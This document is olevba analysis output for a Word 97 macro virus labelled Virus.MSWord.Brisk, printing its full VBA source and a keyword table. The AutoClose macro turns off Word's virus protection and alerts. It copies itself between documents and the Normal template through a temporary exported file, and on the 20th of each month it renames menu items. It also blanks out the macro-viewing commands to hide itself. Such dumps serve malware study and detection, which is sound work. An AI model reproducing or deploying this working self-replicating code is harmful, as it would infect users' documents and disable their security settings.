olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Brisk
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Brisk - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Brisk.bas 
in file: Virus.MSWord.Brisk - OLE stream: 'Macros/VBA/Brisk'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'W97M.Brisk
'Psyclone X [DVC]
On Error Resume Next
With Options
        .VirusProtection = False
        .SaveNormalPrompt = False
        .ConfirmConversions = False
End With
With Application
       .ScreenUpdating = False
       .DisplayStatusBar = False
       .DisplayAlerts = False
End With
Set Norm = NormalTemplate.VBProject.VBComponents
Set Doc = ActiveDocument.VBProject.VBComponents
If Norm.Item("Brisk").Name <> "Brisk" Then
    Doc("Brisk").Export "c:\Brisk.dll"
    Set infect = NormalTemplate.VBProject
 ElseIf Doc.Item("Brisk").Name <> "Brisk" Then
    Norm("Brisk").Export "c:\Brisk.dll"
    Set infect = ActiveDocument.VBProject
End If
infect.VBComponents.Import ("c:\Brisk.dll")
Kill ("c:\Brisk.dll")
If Day(Now) = 20 Then
    MsgBox "Thats Brisk Baby", 0, "Brisk"
    CommandBars("Tools").Controls("Macro").Caption = "Thats Brisk Baby"
    CommandBars("File").Controls("Versions...").Caption = "Thats Brisk Baby"
    CommandBars("Edit").Controls("Paste Special...").Caption = "Thats Brisk Baby"
    CommandBars("File").Controls("Save").Caption = "Thats Brisk Baby"
    CommandBars("File").Controls("Save AS...").Caption = "Thats Brisk Baby"
    CommandBars("Insert").Controls("Break...").Caption = "Thats Brisk Baby"
    CommandBars("Help").Controls("About Microsoft Word").Caption = "Thats Brisk Baby"
    CommandBars("File").Controls("Properties").Caption = "Thats Brisk Baby"
    CommandBars("Edit").Controls("Go To...").Caption = "Thats Brisk Baby"
    CommandBars("Tools").Controls("Word Count...").Caption = "Thats Brisk Baby"
    CommandBars("Format").Controls("Font...").Caption = "Thats Brisk Baby"
    CommandBars("File").Controls("Close").Caption = "Thats Brisk Baby"
    CommandBars("Insert").Controls("Picture").Caption = "Thats Brisk Baby"
    CommandBars("File").Controls("Print...").Caption = "Thats Brisk Baby"
    CommandBars("Format").Controls("Bullets and Numbering...").Caption = "Thats Brisk Baby"
    CommandBars("Tools").Controls("Customize...").Caption = "Thats Brisk Baby"
    CommandBars("Tools").Controls("Spelling and Grammar...").Caption = "Thats Brisk Baby"
    CommandBars("View").Controls("Toolbars").Caption = "Thats Brisk Baby"
    CommandBars("View").Controls("Master Document").Caption = "Thats Brisk Baby"
    CommandBars("View").Controls("Normal").Caption = "Thats Brisk Baby"
End If
End Sub
Sub ToolsMacro()
End Sub
Sub FileTemplates()
End Sub
Sub ViewVBCode()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Brisk.dll           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

